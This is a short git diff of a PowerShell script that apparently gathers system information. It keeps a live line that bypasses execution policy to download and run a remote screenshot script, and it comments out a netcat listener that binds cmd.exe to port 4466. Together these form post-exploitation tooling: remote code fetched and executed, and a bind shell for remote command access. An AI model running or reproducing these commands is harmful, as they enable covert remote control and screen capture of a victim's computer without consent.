@@ -7,5 +7,5 @@ Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property *  | Out-Fil
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/Take-ScreenShot.ps1')"
 
 
-$Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
-Invoke-Expression $Command
+#$Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
+#Invoke-Expression $Command
